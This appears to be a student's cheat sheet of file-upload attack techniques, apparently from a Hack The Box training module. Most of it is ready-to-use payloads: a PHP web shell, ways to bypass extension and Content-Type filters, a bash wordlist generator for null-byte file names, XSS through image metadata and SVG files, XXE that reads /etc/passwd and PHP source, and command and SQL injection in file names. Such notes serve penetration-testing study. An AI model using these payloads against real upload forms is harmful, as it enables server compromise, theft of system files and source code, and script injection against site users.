# Client-Side Validation

- common techniques :

- modifing the `filename` parameter 

```js
filename="HTB.png" -> shell.php
```

- modifing the contetnt of the request to 

```php
<?php system($_REQUEST['cmd']); ?>
```


-  Disabling Front-end Validation remouving the validation function or edit the funtion so that it accepts PHP

```js
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png' && extension !== 'php' ) {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

# Blacklist Filters

- usage of uncommon file extenetions 

```sh
.php3
.php4
.php5
.php7
.php8
.pht
.phar
```
# Character Injection

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

# witelist Filters

- the app say that it only accept image 

```sh
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

- small bash script that generates all permutations of the file name

```sh
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```


# Type Filters

## Content-Type

- fuzzing content-type header with : https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
- change content-type to `image/jpg`

## MIME-Type

- if it accepts gif 

```js
GIF87a
GIF89a
```


# File upload with xss 

## using the image metadata

```sh
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

- using `text/html` may show it as an HTML document that triggers the `XSS`

## using SVG images


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```


# File upload with XXE

-  Reading system files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

- Reading the source code 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

# Other Upload Attacks

- Injections in File Name

```sh
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
<script>alert(window.origin);</script>
file';select+sleep(5);--.jpg
```